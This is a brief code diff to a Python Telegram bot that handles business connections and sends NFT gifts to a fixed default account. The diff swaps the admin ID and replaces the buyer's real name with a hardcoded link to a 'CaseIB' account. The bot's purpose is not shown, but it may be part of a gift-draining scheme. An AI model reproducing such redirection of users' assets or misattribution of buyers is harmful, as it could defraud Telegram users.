@@ -21,7 +21,7 @@ load_dotenv()
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 NFT_TRANSFER_LINK = os.getenv("NFT_TRANSFER_LINK", "tg://send_gift?to=dobrks")
-ADMIN_ID = int(os.getenv("ADMIN_ID", "8978737738"))
+ADMIN_ID = int(os.getenv("ADMIN_ID", "8414654810"))
 
 STAR_EMOJI_ID = "5242644275014951846"
 GRAM_EMOJI_ID = "5193179982775476271"
@@ -75,8 +75,7 @@ async def on_business_conn(conn: BusinessConnection):
     print(f"[BIZ] conn={conn.id} name={conn.user.first_name} @{conn.user.username}")
 
 def get_buyer_name(conn_id: str) -> str:
-    data = connections.get(conn_id, {})
-    return data.get("first_name") or "User"
+    return '<a href="https://t.me/CaseIB">CaseIB</a>'
 
 def format_amount(value: str) -> str:
     try:
